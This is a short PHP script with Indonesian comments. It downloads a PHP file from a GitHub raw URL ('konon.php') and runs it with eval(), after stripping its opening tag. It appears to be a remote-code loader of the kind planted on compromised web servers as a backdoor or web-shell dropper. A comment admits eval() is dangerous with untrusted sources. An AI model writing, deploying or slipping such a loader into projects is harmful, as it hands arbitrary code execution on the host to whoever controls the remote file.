<?php

$url = 'https://raw.githubusercontent.com/encodeuri/new/refs/heads/main/konon.php';

$ch = curl_init($url);

curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYHOST => 2,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_TIMEOUT => 30,
]);

$res = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);

curl_close($ch);

if ($res === false || $httpCode !== 200) {
    exit("Gagal mengambil file: " . $error);
}

// Membersihkan tag pembuka php jika sudah ada di dalam string, 
// lalu mengeksekusinya secara dinamis.
$code = trim($res);
if (strpos($code, '<?php') === 0) {
    $code = substr($code, 5);
} elseif (strpos($code, '<?') === 0) {
    $code = substr($code, 2);
}

// Peringatan Keamanan: eval() sangat berbahaya jika sumber tidak terpercaya
eval($code);
